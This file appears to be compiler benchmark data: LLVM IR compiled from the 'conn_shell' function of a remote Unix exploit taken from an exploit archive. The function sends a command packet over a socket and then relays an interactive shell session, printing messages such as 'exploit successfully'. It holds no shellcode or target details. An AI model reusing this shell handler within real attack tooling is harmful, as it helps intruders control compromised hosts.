; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22975.c_conn_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22975.c_conn_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@NRL = common dso_local global i32 0, align 4
@GET_R = common dso_local global i32 0, align 4
@t_g = common dso_local global i32 0, align 4
@DEF_COMM = common dso_local global i8* null, align 8
@DEF_COMM_OB = common dso_local global i8* null, align 8
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [30 x i8] c" [*] Send, command packet !\0A\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [24 x i8] c" [-] exploit failure.\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [52 x i8] c" [*] exploit successfully ! (&shellcode_addr: %p)\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@SCS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @conn_shell(i32 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %11 = load i32, i32* @NRL, align 4
  store i32 %11, i32* %6, align 4
  %12 = load i32, i32* @GET_R, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %8, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %9, align 8
  %16 = load i32, i32* @t_g, align 4
  switch i32 %16, label %21 [
    i32 0, label %17
    i32 1, label %17
    i32 2, label %17
    i32 3, label %17
    i32 4, label %17
    i32 5, label %17
    i32 6, label %19
    i32 7, label %19
    i32 8, label %19
  ]

17:                                               ; preds = %2, %2, %2, %2, %2, %2
  %18 = load i8*, i8** @DEF_COMM, align 8
  store i8* %18, i8** %7, align 8
  br label %21

19:                                               ; preds = %2, %2, %2
  %20 = load i8*, i8** @DEF_COMM_OB, align 8
  store i8* %20, i8** %7, align 8
  br label %21

21:                                               ; preds = %2, %19, %17
  %22 = load i32, i32* @NRL, align 4
  %23 = trunc i64 %13 to i32
  %24 = call i32 @memset(i8* %15, i32 %22, i32 %23)
  %25 = load i32, i32* @stdout, align 4
  %26 = call i32 (i32, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0))
  %27 = load i32, i32* %3, align 4
  %28 = load i8*, i8** %7, align 8
  %29 = load i8*, i8** %7, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = load i32, i32* @NRL, align 4
  %32 = call i32 @send(i32 %27, i8* %28, i32 %30, i32 %31)
  br label %33

33:                                               ; preds = %103, %21
  %34 = load i32, i32* @stdout, align 4
  %35 = call i32 @fflush(i32 %34)
  %36 = call i32 @FD_ZERO(i32* %10)
  %37 = load i32, i32* %3, align 4
  %38 = call i32 @FD_SET(i32 %37, i32* %10)
  %39 = load i32, i32* @STDIN_FILENO, align 4
  %40 = call i32 @FD_SET(i32 %39, i32* %10)
  %41 = load i32, i32* %3, align 4
  %42 = add nsw i32 %41, 1
  %43 = call i32 @select(i32 %42, i32* %10, i32* null, i32* null, i32* null)
  %44 = load i32, i32* %3, align 4
  %45 = call i64 @FD_ISSET(i32 %44, i32* %10)
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %76

47:                                               ; preds = %33
  %48 = load i32, i32* %3, align 4
  %49 = sub i64 %13, 1
  %50 = trunc i64 %49 to i32
  %51 = call i32 @read(i32 %48, i8* %15, i32 %50)
  store i32 %51, i32* %5, align 4
  %52 = load i32, i32* %5, align 4
  %53 = load i32, i32* @NRL, align 4
  %54 = icmp sle i32 %52, %53
  br i1 %54, label %55, label %68

55:                                               ; preds = %47
  %56 = load i32, i32* %6, align 4
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %62, label %58

58:                                               ; preds = %55
  %59 = load i32, i32* @stderr, align 4
  %60 = call i32 (i32, i8*, ...) @fprintf(i32 %59, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %61 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %61)
  ret void

62:                                               ; preds = %55
  %63 = load i32, i32* @stdout, align 4
  %64 = load i8*, i8** %4, align 8
  %65 = call i32 (i32, i8*, ...) @fprintf(i32 %63, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.2, i64 0, i64 0), i8* %64)
  %66 = load i32, i32* @NRL, align 4
  %67 = call i32 @exit(i32 %66) #4
  unreachable

68:                                               ; preds = %47
  %69 = load i32, i32* @NRL, align 4
  %70 = trunc i32 %69 to i8
  %71 = load i32, i32* %5, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %15, i64 %72
  store i8 %70, i8* %73, align 1
  %74 = load i32, i32* @stdout, align 4
  %75 = call i32 (i32, i8*, ...) @fprintf(i32 %74, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %15)
  br label %76

76:                                               ; preds = %68, %33
  %77 = load i32, i32* @STDIN_FILENO, align 4
  %78 = call i64 @FD_ISSET(i32 %77, i32* %10)
  %79 = icmp ne i64 %78, 0
  br i1 %79, label %80, label %103

80:                                               ; preds = %76
  %81 = load i32, i32* @STDIN_FILENO, align 4
  %82 = sub i64 %13, 1
  %83 = trunc i64 %82 to i32
  %84 = call i32 @read(i32 %81, i8* %15, i32 %83)
  store i32 %84, i32* %5, align 4
  %85 = load i32, i32* %5, align 4
  %86 = load i32, i32* @NRL, align 4
  %87 = icmp sgt i32 %85, %86
  br i1 %87, label %88, label %102

88:                                               ; preds = %80
  %89 = load i32, i32* @NRL, align 4
  %90 = trunc i32 %89 to i8
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %15, i64 %92
  store i8 %90, i8* %93, align 1
  %94 = call i64 @strstr(i8* %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %95 = icmp ne i64 %94, 0
  br i1 %95, label %96, label %98

96:                                               ; preds = %88
  %97 = load i32, i32* @SCS, align 4
  store i32 %97, i32* %6, align 4
  br label %98

98:                                               ; preds = %96, %88
  %99 = load i32, i32* %3, align 4
  %100 = load i32, i32* %5, align 4
  %101 = call i32 @write(i32 %99, i8* %15, i32 %100)
  br label %102

102:                                              ; preds = %98, %80
  br label %103

103:                                              ; preds = %102, %76
  br label %33
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @strstr(i8*, i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
